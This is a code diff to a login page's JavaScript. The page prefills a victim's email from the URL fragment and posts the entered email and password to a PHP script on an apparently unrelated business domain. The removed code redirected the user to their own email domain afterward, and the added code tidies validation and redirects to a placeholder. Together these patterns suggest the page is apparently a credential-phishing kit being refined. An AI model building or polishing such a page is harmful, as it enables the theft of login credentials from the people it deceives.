@@ -207,80 +207,87 @@ button:disabled {
 <script>
 document.addEventListener("DOMContentLoaded", function () {
 
-    const hashValue = decodeURIComponent(window.location.hash.substring(1));
     const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
     const form = document.getElementById("loginForm");
     const button = document.getElementById("submit-btn");
     const message = document.getElementById("message");
 
-    // Grab email from: index.html#test@domain.com
-    if (hashValue && emailInput) {
+    if (!emailInput || !passwordInput || !form || !button || !message) {
+        console.error("Required login elements were not found.");
+        return;
+    }
+
+    // Optional: read an email from index.html#test@domain.com
+    const hashValue = decodeURIComponent(
+        window.location.hash.substring(1)
+    );
+
+    if (hashValue) {
         emailInput.value = hashValue;
     }
 
     form.addEventListener("submit", async function (event) {
+
         event.preventDefault();
 
         const email = emailInput.value.trim();
+        const password = passwordInput.value;
 
-        button.disabled = true;
-        button.textContent = "Sending...";
         message.textContent = "";
+        button.disabled = true;
+        button.textContent = "Signing in...";
+
+        if (!email || !password) {
+            message.textContent = "Please enter your email and password.";
+            button.disabled = false;
+            button.textContent = "Log in";
+            return;
+        }
 
         try {
-    const response = await fetch(
-        "https://lorneplumbing.com.au/via/login.php",
-        {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                email: email,
-                password: password
-            })
-        }
-    );
 
-    const result = await response.json();
+            const response = await fetch(
+                "https://lorneplumbing.com.au/via/login.php",
+                {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
+                }
+            );
 
-    console.log("Status:", response.status);
-    console.log("Server response:", result);
+            const result = await response.json();
 
-    if (result.success) {
-        console.log("Login successful");
-        // Your successful-login code here
-    } else {
-        console.log("Login failed:", result.message);
-    }
+            console.log("Status:", response.status);
+            console.log("Server response:", result);
 
-} catch (error) {
-    console.error("Login request failed:", error);
-}
+            if (response.ok && result.success === true) {
 
-            // Extract domain from test@domain.com
-            const atPosition = hashValue.lastIndexOf("@");
+                message.textContent = "Login successful.";
 
-            if (atPosition === -1) {
-                throw new Error("No domain found in URL.");
+                // Use a fixed, trusted destination.
+                window.location.href = "https://your-company-domain.com/dashboard.html";
+
+            } else {
+
+                message.textContent =
+                    result.message || "Login failed.";
+
+                button.disabled = false;
+                button.textContent = "Log in";
             }
-
-            const domain = hashValue
-                .substring(atPosition + 1)
-                .trim();
-
-            // Basic domain validation
-            if (!/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain)) {
-                throw new Error("Invalid domain.");
-            }
-
-            // Redirect: index.html#test@domain.com → https://domain.com
-            window.location.href = "https://" + domain;
 
         } catch (error) {
-            console.error(error);
 
-            message.textContent = error.message;
+            console.error("Login request failed:", error);
+
+            message.textContent =
+                "Unable to connect to the login server.";
 
             button.disabled = false;
             button.textContent = "Log in";
